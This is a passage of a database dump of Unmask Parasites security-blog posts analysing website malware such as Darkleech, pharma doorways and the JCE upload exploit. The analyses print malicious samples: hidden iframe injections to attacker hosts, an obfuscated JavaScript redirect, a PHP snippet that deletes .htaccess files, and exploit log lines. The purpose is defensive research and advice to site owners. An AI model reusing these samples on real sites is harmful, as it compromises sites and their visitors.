'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (102, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (103, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (104, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (105, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (106, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (107, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (108, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (109, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still 